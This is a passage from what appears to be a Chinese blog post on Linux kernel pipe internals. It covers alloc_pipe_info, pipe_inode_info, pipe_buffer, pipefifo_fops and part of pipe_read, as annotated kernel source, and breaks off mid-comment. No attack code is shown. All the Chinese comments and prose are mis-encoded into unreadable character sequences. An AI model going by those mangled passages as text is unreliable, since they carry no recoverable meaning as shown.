pipe_inode_infoï¼Œç”¨äºå­˜å‚¨ç®¡é“çš„çŠ¶æ€ä¿¡æ¯</span><br>	pipe = alloc_pipe_info();<br>	<span class="hljs-keyword">if</span> (!pipe)<br>		<span class="hljs-keyword">goto</span> fail_iput;<br><br>	inode-&gt;i_pipe = pipe;<br>	pipe-&gt;files = <span class="hljs-number">2</span>;<br>	pipe-&gt;readers = pipe-&gt;writers = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//å°†ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops èµ‹å€¼ç»™ inode çš„æ–‡ä»¶æ“ä½œç¬¦ i_fop</span><br>	inode-&gt;i_fop = &amp;pipefifo_fops;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Mark the inode dirty from the very beginning,</span><br><span class="hljs-comment">	 * that way it will never be moved to the dirty</span><br><span class="hljs-comment">	 * list because &quot;mark_inode_dirty()&quot; will think</span><br><span class="hljs-comment">	 * that it already _is_ on the dirty list.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//è®¾ç½® inode çš„çŠ¶æ€ä¸º I_DIRTYï¼Œè¡¨ç¤ºè¯¥ inode æ˜¯è„çš„ï¼Œéœ€è¦åŒæ­¥åˆ°ç£ç›˜ä¸Šã€‚</span><br>	inode-&gt;i_state = I_DIRTY;<br>	inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;<br>	inode-&gt;i_uid = current_fsuid();<br>	inode-&gt;i_gid = current_fsgid();<br>	inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = current_time(inode);<br><br>	<span class="hljs-keyword">return</span> inode;<br><br>fail_iput:<br>	iput(inode);<br><br>fail_inode:<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="alloc-pipe-info"><a href="#alloc-pipe-info" class="headerlink" title="alloc_pipe_info"></a>alloc_pipe_info</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br>    <span class="hljs-comment">//é»˜è®¤æ•°é‡ä¸º PIPE_DEF_BUFFERS ï¼ˆ16ï¼‰ä¸ªï¼Œå³ä¸€ä¸ªç®¡é“åˆå§‹é»˜è®¤å¯ä»¥å­˜æ”¾ 16 å¼ é¡µé¢çš„æ•°æ®</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br>    <span class="hljs-comment">//user æ˜¯æŒ‡å‘å½“å‰ç”¨æˆ·ä¿¡æ¯ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œé€šè¿‡ get_current_user() å‡½æ•°è·å–</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;	<span class="hljs-comment">//è®¡ç®—å‡ºå½“å‰ç”¨æˆ·å¯ç”¨çš„ç®¡é“ç¼“å†²åŒºæ•°é‡ user_bufs</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<span class="hljs-comment">//ä» pipe_max_size ä¸­è¯»å–ç®¡é“çš„æœ€å¤§size</span><br>	<span class="hljs-comment">//è°ƒç”¨ kzalloc() åˆ†é…å¤§å°ä¸º sizeof(struct pipe_inode_info) çš„å†…å­˜ç©ºé—´ç”¨äºç®¡é“ä¿¡æ¯ç»“æ„ä½“ã€‚å¦‚æœåˆ†é…å¤±è´¥ï¼Œå°†è·³è½¬åˆ° out_free_uid æ ‡ç­¾å¤„é‡Šæ”¾ç”¨æˆ·ç»“æ„ä½“å¹¶è¿”å› NULLã€‚</span><br>	pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br>	<span class="hljs-keyword">if</span> (pipe == <span class="hljs-literal">NULL</span>)<br>		<span class="hljs-keyword">goto</span> out_free_uid;<br>	<span class="hljs-comment">//å¦‚æœç®¡é“ç¼“å†²åŒºæ•°é‡ä¹˜ä»¥é¡µå¤§å°å¤§äºæœ€å¤§å°ºå¯¸ï¼Œå¹¶ä¸”å½“å‰è¿›ç¨‹ä¸å…·å¤‡ CAP_SYS_RESOURCE èƒ½åŠ›ï¼Œåˆ™å°†ç®¡é“ç¼“å†²åŒºæ•°é‡è°ƒæ•´ä¸ºæœ€å¤§å°ºå¯¸é™¤ä»¥é¡µå¤§å°ã€‚</span><br>	<span class="hljs-keyword">if</span> (pipe_bufs * PAGE_SIZE &gt; max_size &amp;&amp; !capable(CAP_SYS_RESOURCE))<br>		pipe_bufs = max_size &gt;&gt; PAGE_SHIFT;<br>	<span class="hljs-comment">//è°ƒç”¨ account_pipe_buffers() å‡½æ•°æ¥è®¡ç®—å½“å‰ç”¨æˆ·å¯ç”¨çš„ç®¡é“ç¼“å†²åŒºæ•°é‡ user_bufs</span><br>	user_bufs = account_pipe_buffers(user, <span class="hljs-number">0</span>, pipe_bufs);<br>	<span class="hljs-comment">//å¦‚æœå½“å‰ç”¨æˆ·çš„ç®¡é“ç¼“å†²åŒºæ•°é‡è¶…è¿‡è½¯é™åˆ¶å¹¶ä¸”ç®¡é“æ˜¯ç”±éç‰¹æƒç”¨æˆ·åˆ›å»ºçš„ï¼Œåˆ™å°è¯•é™ä½ç®¡é“ç¼“å†²åŒºæ•°é‡åˆ°è½¯é™åˆ¶ä»¥ä¸‹ï¼Œå¹¶å°†ç®¡é“ç¼“å†²åŒºæ•°é‡è®¾ç½®ä¸º1ã€‚</span><br>	<span class="hljs-keyword">if</span> (too_many_pipe_buffers_soft(user_bufs) &amp;&amp; pipe_is_unprivileged_user()) &#123;<br>		user_bufs = account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">1</span>);<br>		pipe_bufs = <span class="hljs-number">1</span>;<br>	&#125;<br>	<span class="hljs-comment">//å¦‚æœå½“å‰ç”¨æˆ·çš„ç®¡é“ç¼“å†²åŒºæ•°é‡è¶…è¿‡ç¡¬é™åˆ¶å¹¶ä¸”ç®¡é“æ˜¯ç”±éç‰¹æƒç”¨æˆ·åˆ›å»ºçš„ï¼Œåˆ™æ”¾å¼ƒåˆ›å»ºç®¡é“ï¼Œå¹¶è·³è½¬åˆ° out_revert_acct æ ‡ç­¾å¤„è¿›è¡Œæ¸…ç†ã€‚</span><br>	<span class="hljs-keyword">if</span> (too_many_pipe_buffers_hard(user_bufs) &amp;&amp; pipe_is_unprivileged_user())<br>		<span class="hljs-keyword">goto</span> out_revert_acct;<br>	<span class="hljs-comment">//åˆ†é…å¤§å°ä¸º pipe_bufs ä¸ª struct pipe_buffer çš„å†…å­˜ç©ºé—´ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™ pipe-&gt;bufsï¼Œè¡¨ç¤ºç®¡é“çš„ç¼“å†²åŒº</span><br>	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>			     GFP_KERNEL_ACCOUNT);<br><br>	<span class="hljs-keyword">if</span> (pipe-&gt;bufs) &#123;<br>		init_waitqueue_head(&amp;pipe-&gt;rd_wait);<br>		init_waitqueue_head(&amp;pipe-&gt;wr_wait);<br>		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="hljs-number">1</span>;<br>		pipe-&gt;max_usage = pipe_bufs;<br>		pipe-&gt;ring_size = pipe_bufs;<br>		pipe-&gt;nr_accounted = pipe_bufs;<br>		pipe-&gt;user = user;<br>		mutex_init(&amp;pipe-&gt;mutex);<br>		<span class="hljs-keyword">return</span> pipe;<br>	&#125;<br><br>out_revert_acct:<br>	(<span class="hljs-type">void</span>) account_pipe_buffers(user, pipe_bufs, <span class="hljs-number">0</span>);<br>	kfree(pipe);<br>out_free_uid:<br>	free_uid(user);<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="pipe-inode-info"><a href="#pipe-inode-info" class="headerlink" title="pipe_inode_info"></a>pipe_inode_info</h3><p>ç®¡é“çš„å®è´¨æ˜¯ç”±ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“æ¥ç®¡ç†çš„ï¼Œå…¶pipe_bufferç±»ä¼¼äºå¾ªç¯é˜Ÿåˆ—ã€‚åœ¨è¿™ä¸ªå¾ªç¯é˜Ÿåˆ—ä¸­ï¼Œç®¡é“çš„å†™å…¥æ“ä½œæ˜¯å‘é˜Ÿåˆ—å¤´éƒ¨æ·»åŠ æ•°æ®ï¼ˆå³å¾€é˜Ÿåˆ—å°¾éƒ¨ç§»åŠ¨ï¼‰ï¼Œè€Œè¯»å–æ“ä½œåˆ™æ˜¯ä»é˜Ÿåˆ—å°¾éƒ¨è·å–æ•°æ®ï¼ˆå³ä»é˜Ÿåˆ—å¤´éƒ¨ç§»åŠ¨ï¼‰ã€‚åœ¨ç®¡é“çš„ <code>pipe_inode_info</code> ç»“æ„ä½“ä¸­ï¼Œ<code>head</code> æˆå‘˜è¡¨ç¤ºé˜Ÿåˆ—å¤´çš„ç´¢å¼•ï¼Œ<code>tail</code> æˆå‘˜è¡¨ç¤ºé˜Ÿåˆ—å°¾çš„ç´¢å¼•ï¼Œå¤´è¿›å°¾å‡º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *	@mutex: mutex protecting the whole thing</span><br><span class="hljs-comment"> *	@rd_wait: reader wait point in case of empty pipe</span><br><span class="hljs-comment"> *	@wr_wait: writer wait point in case of full pipe</span><br><span class="hljs-comment"> *	@head: The point of buffer production</span><br><span class="hljs-comment"> *	@tail: The point of buffer consumption</span><br><span class="hljs-comment"> *	@note_loss: The next read() should insert a data-lost message</span><br><span class="hljs-comment"> *	@max_usage: The maximum number of slots that may be used in the ring</span><br><span class="hljs-comment"> *	@ring_size: total number of buffers (should be a power of 2)</span><br><span class="hljs-comment"> *	@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *	@tmp_page: cached released page</span><br><span class="hljs-comment"> *	@readers: number of current readers of this pipe</span><br><span class="hljs-comment"> *	@writers: number of current writers of this pipe</span><br><span class="hljs-comment"> *	@files: number of struct file referring this pipe (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *	@r_counter: reader counter</span><br><span class="hljs-comment"> *	@w_counter: writer counter</span><br><span class="hljs-comment"> *	@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *	@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *	@bufs: the circular array of pipe buffers</span><br><span class="hljs-comment"> *	@user: the user who created this pipe</span><br><span class="hljs-comment"> *	@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_queue</span> *<span class="hljs-title">watch_queue</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *	@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *	@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *	@len: length of data inside the @page</span><br><span class="hljs-comment"> *	@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *	@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *	@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p><code>pipe</code>çš„å¤§ä½“ç»“æ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼ˆå›¾æ¥è‡ªA3ğŸ‘´çš„blogï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240318220949.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="pipeã®å‡½æ•°è¡¨"><a href="#pipeã®å‡½æ•°è¡¨" class="headerlink" title="pipeã®å‡½æ•°è¡¨"></a>pipeã®å‡½æ•°è¡¨</h2><p>ç»è¿‡å¦‚ä¸‹è°ƒç”¨é“¾</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SCSS">do_pipe2<br>	__do_pipe_flags<br>		create_pipe_files<br>			alloc_file_pseudo<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//å‡½æ•°åˆ›å»ºä¸€ä¸ªä¼ªæ–‡ä»¶å¯¹è±¡ï¼Œè¯¥æ–‡ä»¶å¯¹è±¡è¿æ¥åˆ°ä¹‹å‰è·å–çš„ç®¡é“ inode ä¸Šã€‚å®ƒå°†æ ¹æ®ä¼ å…¥çš„æ ‡å¿—è®¾ç½®æ–‡ä»¶çš„è¯»å†™å±æ€§ï¼Œå¹¶å°†å…¶ä¸ç®¡é“çš„æ“ä½œå‡½æ•° pipefifo_fops å…³è”èµ·æ¥ã€‚å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œä¼šé‡Šæ”¾ä¹‹å‰åˆ†é…çš„ç®¡é“ä¿¡æ¯å¹¶é‡Šæ”¾ inodeï¼Œç„¶åè¿”å›ç›¸åº”çš„é”™è¯¯ä»£ç ã€‚</span><br>	f = alloc_file_pseudo(inode, pipe_mnt, <span class="hljs-string">&quot;&quot;</span>,<br>				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),<br>				&amp;pipefifo_fops);<br></code></pre></td></tr></table></figure>

<p><strong>pipefifo_ops</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">pipefifo_fops</span> =</span> &#123;<br>	.open		= fifo_open,<br>	.llseek		= no_llseek,<br>	.read_iter	= pipe_read,<br>	.write_iter	= pipe_write,<br>	.poll		= pipe_poll,<br>	.unlocked_ioctl	= pipe_ioctl,<br>	.release	= pipe_release,<br>	.fasync		= pipe_fasync,<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>é‡ç‚¹å…³æ³¨è¯»å†™æ“ä½œ</p>
<h3 id="pipe-read"><a href="#pipe-read" class="headerlink" title="pipe_read"></a>pipe_read</h3><p>ä»<code>pipe</code>ä¸­è¯»å–æ•°æ®ï¼Œä¼šè°ƒç”¨åˆ°<code>pipe_read</code></p>
<p>ä¸€ä¸ªæ¥ä¸€ä¸ªçš„è¯»å–bufferä¸­çš„æ•°æ®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *to)</span><br>&#123;<br>	<span class="hljs-type">size_t</span> total_len = iov_iter_count(to);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br>	<span class="hljs-type">bool</span> was_full, wake_next_reader = <span class="hljs-literal">false</span>;<span class="hljs-comment">//ç”¨äºè®°å½•ç®¡é“æ˜¯å¦æ»¡äº†ä»¥åŠæ˜¯å¦éœ€è¦å”¤é†’ä¸‹ä¸€ä¸ªè¯»å–è€…ã€‚</span><br>	<span class="hljs-type">ssize_t</span> ret;<br><br>	<span class="hljs-comment">/* Null read succeeds. */</span><br>    <span class="hljs-comment">//å¦‚æœ total_len ä¸ºé›¶ï¼Œè¡¨ç¤ºè¯·æ±‚çš„è¯»å–é•¿åº¦ä¸ºé›¶ï¼Œç›´æ¥è¿”å›é›¶ï¼Œè¡¨ç¤ºè¯»å–æˆåŠŸ</span><br>	<span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//ä½¿ç”¨ __pipe_lock å‡½æ•°é”å®šç®¡é“ï¼Œä»¥ç¡®ä¿åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¯¹ç®¡é“çš„å®‰å…¨è®¿é—®</span><br>	__pipe_lock(pipe);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * We only wake up writers if the pipe was full when we started</span><br><span class="hljs-comment">	 * reading in order to avoid unnecessary wakeups.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * But when we do wake up writers, we do so using a sync wakeup</span><br><span class="hljs-comment">	 * (WF_SYNC), because we want them to get going and generate more</span><br><span class="hljs-comment">	 * data for us.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//å¦‚æœç®¡é“çš„å¤´éƒ¨æŒ‡é’ˆç­‰äºå°¾éƒ¨æŒ‡é’ˆåŠ ä¸Šæœ€å¤§ä½¿ç”¨é‡ï¼Œåˆ™è¡¨ç¤ºç®¡é“å·²æ»¡</span><br>	was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>    <span class="hljs-comment">//æ— é™å¾ªç¯ä¸­ï¼Œå°è¯•ä»ç®¡é“ä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°è¯»å–å®Œæˆæˆ–å‡ºç°é”™è¯¯</span><br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">/*head è¡¨ç¤ºç®¡é“ä¸­ä¸‹ä¸€ä¸ªè¦è¯»å–çš„æ•°æ®ä½ç½®ã€‚</span><br><span class="hljs-comment">		tail è¡¨ç¤ºç®¡é“ä¸­ä¸‹ä¸€ä¸ªè¦å†™å…¥æ•°æ®çš„ä½ç½®ã€‚</span><br><span class="hljs-comment">		mask æ˜¯ä¸€ä¸ªæ©ç ï¼Œç”¨äºè®¡ç®—ç´¢å¼•ï¼Œç¡®ä¿ç´¢å¼•ä¸ä¼šè¶…å‡ºç¼“å†²åŒºçš„èŒƒå›´ã€‚*/</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>        <span class="hljs-comment">//å¦‚æœç®¡é“çš„ note_loss æ ‡å¿—ä¸ºçœŸï¼Œå¹¶ä¸”å¾…è¯»å–æ•°æ®é•¿åº¦å°äº 